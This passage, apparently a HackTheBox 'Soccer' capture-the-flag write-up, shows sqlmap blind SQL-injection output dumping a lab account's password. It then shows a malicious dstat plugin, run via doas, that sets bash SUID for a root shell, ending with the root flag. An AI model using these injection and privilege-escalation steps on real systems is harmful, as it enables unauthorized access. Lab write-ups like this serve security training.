+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">columns</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="nx">email</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="nx">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="nx">password</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="nx">username</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">resumed</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="p">(</span><span class="k">case</span><span class="p">)</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">comparison</span> <span class="nx">requires</span> <span class="nx">larger</span> <span class="nx">statistical</span> <span class="nx">model</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">wait</span><span class="p">..............................</span> <span class="p">(</span><span class="nx">done</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">sqlmap</span> <span class="nx">to</span> <span class="k">try</span> <span class="nx">to</span> <span class="nx">optimize</span> <span class="nx">value</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="k">for</span> <span class="nx">DBMS</span> <span class="nx">delay</span> <span class="nx">responses</span> <span class="p">(</span><span class="nx">option</span> <span class="s1">&#39;--time-sec&#39;</span><span class="p">)</span><span class="o">?</span> <span class="p">[</span><span class="nx">Y</span><span class="o">/</span><span class="nx">n</span><span class="p">]</span> <span class="nx">Y</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">11</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">very</span> <span class="nx">important</span> <span class="nx">to</span> <span class="nx">not</span> <span class="nx">stress</span> <span class="nx">the</span> <span class="nx">network</span> <span class="nx">connection</span> <span class="nx">during</span> <span class="nx">usage</span> <span class="k">of</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">payloads</span> <span class="nx">to</span> <span class="nx">prevent</span> <span class="nx">potential</span> <span class="nx">disruptions</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">adjusting</span> <span class="nx">time</span> <span class="nx">delay</span> <span class="nx">to</span> <span class="mi">1</span> <span class="nx">second</span> <span class="nx">due</span> <span class="nx">to</span> <span class="nx">good</span> <span class="nx">response</span> <span class="nx">times</span>
+</span></span><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">player</span><span class="p">.</span><span class="nx">htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">45</span><span class="o">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="mi">1324</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">PlayerOftheMatch</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="nx">ERROR</span><span class="p">]</span> <span class="nx">invalid</span> <span class="nx">character</span> <span class="nx">detected</span><span class="p">.</span> <span class="nx">retrying</span><span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">increasing</span> <span class="nx">time</span> <span class="nx">delay</span> <span class="nx">to</span> <span class="mi">2</span> <span class="nx">seconds</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Database</span><span class="o">:</span> <span class="nx">soccer_db</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Table</span><span class="o">:</span> <span class="nx">accounts</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">1</span> <span class="nx">entry</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------+-------------------+----------------------+----------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">id</span>   <span class="o">|</span> <span class="nx">email</span>             <span class="o">|</span> <span class="nx">password</span>             <span class="o">|</span> <span class="nx">username</span> <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------+-------------------+----------------------+----------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">1324</span> <span class="o">|</span> <span class="nx">player</span><span class="err">@</span><span class="nx">player</span><span class="p">.</span><span class="nx">htb</span> <span class="o">|</span> <span class="nx">PlayerOftheMatch2022</span> <span class="o">|</span> <span class="nx">player</span>   <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------+-------------------+----------------------+----------+</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">player</span><span class="o">:</span><span class="nx">PlayerOftheMatch2022</span>
+</span></span></code></pre></div><p>We got a user’s password i.e. <code>player</code> , next up we can directly SSH into the machine as the <code>player</code> user, checking for any SUID binaries, we can see that <code>doas</code> can be ran as SUID, checking the <code>doas.conf</code> file to see how it is configured:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:~</span><span class="nx">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">doas</span><span class="p">.</span><span class="nx">conf</span>
+</span></span><span class="line"><span class="cl"><span class="nx">permit</span> <span class="nx">nopass</span> <span class="nx">player</span> <span class="nx">as</span> <span class="nx">root</span> <span class="nx">cmd</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">dstat</span>
+</span></span></code></pre></div><p>We can see that <code>dstat</code> can be ran as <code>root</code> using <code>doas</code> , to exploit this we can add a <code>dstat</code> plugin with specified format of any existing plugin, following blog shows how to perform the steps clearly:</p>
+<aside>
+💡 In this particular case, you need to specify a class `dstat_plugin` class in the plugin script i.e. the malicious python script, in order to make it work and comply with the `dstat`
+</aside>
+<p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/" target="_blank" rel="noreferrer">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</a></p>
+<p>Just adding a <code>os.system</code> function call which will execute the payload, making the <code>/usr/bin/bash</code> as a SUID binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/dstat$ cat &gt; dstat_xploit.py</span>
+</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">dstat_plugin</span><span class="p">(</span><span class="nx">dstat</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Example &#34;</span><span class="nx">Hello</span> <span class="nx">world</span><span class="o">!</span><span class="s2">&#34; output plugin for aspiring Dstat developers.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">def</span> <span class="nx">__init__</span><span class="p">(</span><span class="nx">self</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s1">&#39;plugin title&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">nick</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;counter&#39;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">vars</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">scale</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">def</span> <span class="nx">extract</span><span class="p">(</span><span class="nx">self</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">import</span> <span class="nx">os</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;chmod +s /usr/bin/bash&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="p">.</span><span class="nx">val</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Hello world!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">^</span><span class="nx">C</span>
+</span></span><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/dstat$ dstat -l</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="nx">load</span><span class="o">-</span><span class="nx">avg</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">1</span><span class="nx">m</span>   <span class="mi">5</span><span class="nx">m</span>  <span class="mi">15</span><span class="nx">m</span> 
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>    <span class="mi">0</span>    <span class="mi">0</span><span class="o">^</span><span class="nx">C</span>
+</span></span><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/dstat$ dstat --list</span>
+</span></span><span class="line"><span class="cl"><span class="nx">internal</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">aio</span><span class="p">,</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">cpu</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">cpu</span><span class="o">-</span><span class="nx">use</span><span class="p">,</span><span class="nx">cpu24</span><span class="p">,</span><span class="nx">disk</span><span class="p">,</span><span class="nx">disk24</span><span class="p">,</span><span class="nx">disk24</span><span class="o">-</span><span class="nx">old</span><span class="p">,</span><span class="nx">epoch</span><span class="p">,</span><span class="nx">fs</span><span class="p">,</span><span class="kr">int</span><span class="p">,</span><span class="nx">int24</span><span class="p">,</span><span class="nx">io</span><span class="p">,</span><span class="nx">ipc</span><span class="p">,</span><span class="nx">load</span><span class="p">,</span><span class="nx">lock</span><span class="p">,</span><span class="nx">mem</span><span class="p">,</span><span class="nx">mem</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">net</span><span class="p">,</span><span class="nx">page</span><span class="p">,</span><span class="nx">page24</span><span class="p">,</span><span class="nx">proc</span><span class="p">,</span><span class="nx">raw</span><span class="p">,</span><span class="nx">socket</span><span class="p">,</span><span class="nx">swap</span><span class="p">,</span><span class="nx">swap</span><span class="o">-</span><span class="nx">old</span><span class="p">,</span><span class="nx">sys</span><span class="p">,</span><span class="nx">tcp</span><span class="p">,</span><span class="nx">time</span><span class="p">,</span><span class="nx">udp</span><span class="p">,</span><span class="nx">unix</span><span class="p">,</span><span class="nx">vm</span><span class="p">,</span><span class="nx">vm</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">zones</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/share/dstat:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">battery</span><span class="p">,</span><span class="nx">battery</span><span class="o">-</span><span class="nx">remain</span><span class="p">,</span><span class="nx">condor</span><span class="o">-</span><span class="nx">queue</span><span class="p">,</span><span class="nx">cpufreq</span><span class="p">,</span><span class="nx">dbus</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">avgqu</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">avgrq</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">svctm</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">tps</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">util</span><span class="p">,</span><span class="nx">disk</span><span class="o">-</span><span class="nx">wait</span><span class="p">,</span><span class="nx">dstat</span><span class="p">,</span><span class="nx">dstat</span><span class="o">-</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">dstat</span><span class="o">-</span><span class="nx">ctxt</span><span class="p">,</span><span class="nx">dstat</span><span class="o">-</span><span class="nx">mem</span><span class="p">,</span><span class="nx">fan</span><span class="p">,</span><span class="nx">freespace</span><span class="p">,</span><span class="nx">fuse</span><span class="p">,</span><span class="nx">gpfs</span><span class="p">,</span><span class="nx">gpfs</span><span class="o">-</span><span class="nx">ops</span><span class="p">,</span><span class="nx">helloworld</span><span class="p">,</span><span class="nx">ib</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">innodb</span><span class="o">-</span><span class="nx">buffer</span><span class="p">,</span><span class="nx">innodb</span><span class="o">-</span><span class="nx">io</span><span class="p">,</span><span class="nx">innodb</span><span class="o">-</span><span class="nx">ops</span><span class="p">,</span><span class="nx">jvm</span><span class="o">-</span><span class="nx">full</span><span class="p">,</span><span class="nx">jvm</span><span class="o">-</span><span class="nx">vm</span><span class="p">,</span><span class="nx">lustre</span><span class="p">,</span><span class="nx">md</span><span class="o">-</span><span class="nx">status</span><span class="p">,</span><span class="nx">memcache</span><span class="o">-</span><span class="nx">hits</span><span class="p">,</span><span class="nx">mongodb</span><span class="o">-</span><span class="nx">conn</span><span class="p">,</span><span class="nx">mongodb</span><span class="o">-</span><span class="nx">mem</span><span class="p">,</span><span class="nx">mongodb</span><span class="o">-</span><span class="nx">opcount</span><span class="p">,</span><span class="nx">mongodb</span><span class="o">-</span><span class="nx">queue</span><span class="p">,</span><span class="nx">mongodb</span><span class="o">-</span><span class="nx">stats</span><span class="p">,</span><span class="nx">mysql</span><span class="o">-</span><span class="nx">io</span><span class="p">,</span><span class="nx">mysql</span><span class="o">-</span><span class="nx">keys</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">cmds</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">conn</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">innodb</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">mysql5</span><span class="o">-</span><span class="nx">innodb</span><span class="o">-</span><span class="nx">basic</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">innodb</span><span class="o">-</span><span class="nx">extra</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">io</span><span class="p">,</span><span class="nx">mysql5</span><span class="o">-</span><span class="nx">keys</span><span class="p">,</span><span class="nx">net</span><span class="o">-</span><span class="nx">packets</span><span class="p">,</span><span class="nx">nfs3</span><span class="p">,</span><span class="nx">nfs3</span><span class="o">-</span><span class="nx">ops</span><span class="p">,</span><span class="nx">nfsd3</span><span class="p">,</span><span class="nx">nfsd3</span><span class="o">-</span><span class="nx">ops</span><span class="p">,</span><span class="nx">nfsd4</span><span class="o">-</span><span class="nx">ops</span><span class="p">,</span><span class="nx">nfsstat4</span><span class="p">,</span><span class="nx">ntp</span><span class="p">,</span><span class="nx">postfix</span><span class="p">,</span><span class="nx">power</span><span class="p">,</span><span class="nx">proc</span><span class="o">-</span><span class="nx">count</span><span class="p">,</span><span class="nx">qmail</span><span class="p">,</span><span class="nx">redis</span><span class="p">,</span><span class="nx">rpc</span><span class="p">,</span><span class="nx">rpcd</span><span class="p">,</span><span class="nx">sendmail</span><span class="p">,</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">load</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">snmp</span><span class="o">-</span><span class="nx">mem</span><span class="p">,</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">net</span><span class="p">,</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">net</span><span class="o">-</span><span class="nx">err</span><span class="p">,</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">sys</span><span class="p">,</span><span class="nx">snooze</span><span class="p">,</span><span class="nx">squid</span><span class="p">,</span><span class="nx">test</span><span class="p">,</span><span class="nx">thermal</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">bio</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">bio</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">childwait</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">cpu</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">cputime</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">cputime</span><span class="o">-</span><span class="nx">avg</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="kr">int</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">io</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">io</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">latency</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">latency</span><span class="o">-</span><span class="nx">avg</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">top</span><span class="o">-</span><span class="nx">mem</span><span class="p">,</span><span class="nx">top</span><span class="o">-</span><span class="nx">oom</span><span class="p">,</span><span class="nx">utmp</span><span class="p">,</span><span class="nx">vm</span><span class="o">-</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">vm</span><span class="o">-</span><span class="nx">mem</span><span class="p">,</span><span class="nx">vm</span><span class="o">-</span><span class="nx">mem</span><span class="o">-</span><span class="nx">adv</span><span class="p">,</span><span class="nx">vmk</span><span class="o">-</span><span class="nx">hba</span><span class="p">,</span><span class="nx">vmk</span><span class="o">-</span><span class="kr">int</span><span class="p">,</span><span class="nx">vmk</span><span class="o">-</span><span class="nx">nic</span><span class="p">,</span><span class="nx">vz</span><span class="o">-</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">vz</span><span class="o">-</span><span class="nx">io</span><span class="p">,</span><span class="nx">vz</span><span class="o">-</span><span class="nx">ubc</span><span class="p">,</span><span class="nx">wifi</span><span class="p">,</span><span class="nx">zfs</span><span class="o">-</span><span class="nx">arc</span><span class="p">,</span><span class="nx">zfs</span><span class="o">-</span><span class="nx">l2arc</span><span class="p">,</span><span class="nx">zfs</span><span class="o">-</span><span class="nx">zil</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/local/share/dstat:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">xploit</span>
+</span></span><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/ds</span>
+</span></span></code></pre></div><p>Once executed, we can see that <code>/usr/bin/bash</code> has now became an SUID, we can spawn the <code>bash</code> in a privileged mode with <code>-p</code> and continue as root user in the machine:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Get the flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/dstat$ ls -la /usr/bin/bash</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rwsr</span><span class="o">-</span><span class="nx">sr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">1183448</span> <span class="nx">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+</span></span><span class="line"><span class="cl"><span class="nx">player</span><span class="err">@</span><span class="nx">soccer</span><span class="o">:</span><span class="err">/usr/local/share/dstat$ /usr/bin/bash -p</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="nx">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="nx">root</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="nx">id</span>
+</span></span><span class="line"><span class="cl"><span class="nx">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span> <span class="nx">euid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">egid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="nx">cd</span> <span class="o">/</span><span class="nx">root</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="nx">ls</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span>  <span class="nx">root</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">run</span><span class="p">.</span><span class="nx">sql</span>	<span class="nx">snap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="nx">cat</span> <span class="nx">root</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">78</span><span class="nx">e0183f20973bb59927b351bc26c4b1</span>
+</span></span></code></pre></div>
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/bagel-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Bagel</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-03 00:00:00 &#43;0000 UTC">3 June 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/escape-htb/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Escape</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-19 00:00:00 &#43;0000 UTC">19 June 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
